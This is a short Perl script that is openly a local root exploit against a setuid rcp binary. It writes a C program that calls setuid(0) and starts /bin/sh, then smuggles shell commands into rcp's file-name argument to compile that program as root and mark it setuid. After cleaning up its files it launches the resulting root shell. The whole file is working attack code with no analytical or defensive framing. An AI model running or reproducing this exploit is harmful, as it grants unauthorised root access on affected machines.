#!/usr/bin/perl -w

$RCPFILE="/usr/bin/rcp" ;

sub USAGE
{
    printf "Starting RCP Exploit" ;
    exit 0 ;
}

if ( ! -u "$RCPFILE" )
{
    printf "RCP is not suid, quiting\n" ;
    exit 0;
}

open(TEMP, ">>/tmp/shell.c")|| die "Something went wrong: $!" ;
printf TEMP "#include<unistd.h>\n#include<stdlib.h>\nint main()\n{" ;
printf TEMP "    setuid(0);\n\tsetgid(0);\n\texecl(\"/bin/sh\",\"sh\",0);\n\treturn 0;\n}\n" ;
close(TEMP);
open(HMM, ">hey")|| die "Something went wrong: $!";
close(HMM);

system "rcp 'hey geezer; gcc -o /tmp/shell /tmp/shell.c;' localhost 2> /dev/null" ;
system "rcp 'hey geezer; chmod +s /tmp/shell;' localhost 2> /dev/null" ;
unlink("/tmp/shell.c");
unlink("hey");
unlink("geezer");
printf "Ok, launching a rootshell, lets hope shit went well ... \n" ;
exec '/tmp/shell' ;
#EOF
